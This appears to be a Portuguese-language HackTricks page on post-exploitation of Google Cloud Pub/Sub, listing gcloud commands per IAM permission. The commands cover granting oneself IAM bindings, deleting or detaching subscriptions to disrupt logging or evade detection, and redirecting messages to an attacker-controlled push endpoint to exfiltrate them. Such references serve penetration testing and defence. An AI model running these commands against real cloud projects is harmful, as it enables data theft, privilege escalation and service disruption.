# GCP - Pub/Sub Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Pub/Sub

Para mais informações sobre Pub/Sub, consulte a seguinte página:

{{#ref}}
../gcp-services/gcp-pub-sub.md
{{#endref}}

### `pubsub.topics.publish`

Publica uma mensagem em um tópico, útil para **enviar dados inesperados** e acionar funcionalidades inesperadas ou exploit vulnerabilities:

<details>

<summary>Publicar mensagem no tópico</summary>
```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"
```
</details>

### `pubsub.topics.detachSubscription`

Útil para impedir que uma subscription receba mensagens, talvez para evitar detecção.

<details>

<summary>Desanexar a subscription do topic</summary>
```bash
gcloud pubsub topics detach-subscription <FULL SUBSCRIPTION NAME>
```
</details>

### `pubsub.topics.delete`

Útil para impedir que uma assinatura receba mensagens, talvez para evitar detecção.\
É possível excluir um tópico mesmo com assinaturas anexadas a ele.

<details>

<summary>Excluir tópico</summary>
```bash
gcloud pubsub topics delete <TOPIC NAME>
```
</details>

### `pubsub.topics.update`

Use esta permissão para atualizar alguma configuração do tópico para perturbá-lo, como `--clear-schema-settings`, `--message-retention-duration`, `--message-storage-policy-allowed-regions`, `--schema`, `--schema-project`, `--topic-encryption-key`...

### `pubsub.topics.setIamPolicy`

Conceda a si mesmo permissão para executar qualquer um dos ataques anteriores.
```bash
# Add Binding
gcloud pubsub topics add-iam-policy-binding <TOPIC_NAME> \
--member="serviceAccount:<SA_NAME>@<PROJECT_ID>.iam.gserviceaccount.com" \
--role="<ROLE_OR_CUSTOM_ROLE>" \
--project="<PROJECT_ID>"

# Remove Binding
gcloud pubsub topics remove-iam-policy-binding <TOPIC_NAME> \
--member="serviceAccount:<SA_NAME>@<PROJECT_ID>.iam.gserviceaccount.com" \
--role="<ROLE_OR_CUSTOM_ROLE>" \
--project="<PROJECT_ID>"

# Change Policy
gcloud pubsub topics set-iam-policy <TOPIC_NAME> \
<(echo '{
"bindings": [
{
"role": "<ROLE_OR_CUSTOM_ROLE>",
"members": [
"serviceAccount:<SA_NAME>@<PROJECT_ID>.iam.gserviceaccount.com"
]
}
]
}') \
--project=<PROJECT_ID>
```
### **`pubsub.subscriptions.create,`**`pubsub.topics.attachSubscription` , (`pubsub.subscriptions.consume`)

Obter todas as mensagens em um servidor web:

<details>

<summary>Criar push subscription para receber mensagens</summary>
```bash
# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint https://<URL to push to>
```
</details>

Crie uma subscription e use-a para recuperar mensagens (pull):

<details>

<summary>Criar uma subscription pull e recuperar mensagens</summary>
```bash
# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create <subscription name> --topic <topic_name>

# You also need pubsub.subscriptions.consume for this
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>
## This command will wait for a message to be posted
```
</details>

### `pubsub.subscriptions.delete`

**Excluir uma assinatura** pode ser útil para interromper um sistema de processamento de logs ou algo similar:

<details>

<summary>Excluir assinatura</summary>
```bash
gcloud pubsub subscriptions delete <FULL SUBSCRIPTION NAME>
```
</details>

### `pubsub.subscriptions.update`

Use esta permissão para atualizar alguma configuração para que as mensagens sejam armazenadas em um lugar que você possa acessar (URL, Big Query table, Bucket) ou apenas para causar uma interrupção.

<details>

<summary>Endpoint de atualização da subscription</summary>
```bash
gcloud pubsub subscriptions update --push-endpoint <your URL> <subscription-name>
```
</details>

### `pubsub.subscriptions.setIamPolicy`

Conceda a si mesmo as permissões necessárias para executar qualquer um dos ataques mencionados anteriormente.

### `pubsub.schemas.attach`, `pubsub.topics.update`,(`pubsub.schemas.create`)

Ataque um schema a um tópico de modo que as mensagens não o satisfaçam e, portanto, o tópico seja interrompido.\
Se não houver schemas, pode ser necessário criar um.

<details>

<summary>Criar arquivo de schema e anexá-lo ao tópico</summary>
```json:schema.json
{
"namespace": "com.example",
"type": "record",
"name": "Person",
"fields": [
{
"name": "name",
"type": "string"
},
{
"name": "age",
"type": "int"
}
]
}
```

```bash
# Attach new schema
gcloud pubsub topics update projects/<project-name>/topics/<topic-id> \
--schema=projects/<project-name>/schemas/<topic-id> \
--message-encoding=json
```
</details>

### `pubsub.schemas.delete`

Pode parecer que, ao deletar um schema, você poderá enviar mensagens que não cumprem o schema. No entanto, como o schema será deletado, nenhuma mensagem realmente entrará no tópico. Portanto, isto é **INÚTIL**:

<details>

<summary>Deletar schema (inútil)</summary>
```bash
gcloud pubsub schemas delete <SCHEMA NAME>
```
</details>

### `pubsub.schemas.setIamPolicy`

Conceda a si mesmo as permissões necessárias para executar qualquer um dos ataques comentados anteriormente.

### `pubsub.snapshots.create`, `pubsub.snapshots.seek`

Isso criará um snapshot de todas as mensagens unACKed e as colocará de volta na subscription. Não é muito útil para um atacante, mas aqui está:

<details>

<summary>Criar snapshot e fazer seek nele</summary>
```bash
gcloud pubsub snapshots create YOUR_SNAPSHOT_NAME \
--subscription=YOUR_SUBSCRIPTION_NAME
gcloud pubsub subscriptions seek YOUR_SUBSCRIPTION_NAME \
--snapshot=YOUR_SNAPSHOT_NAME
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
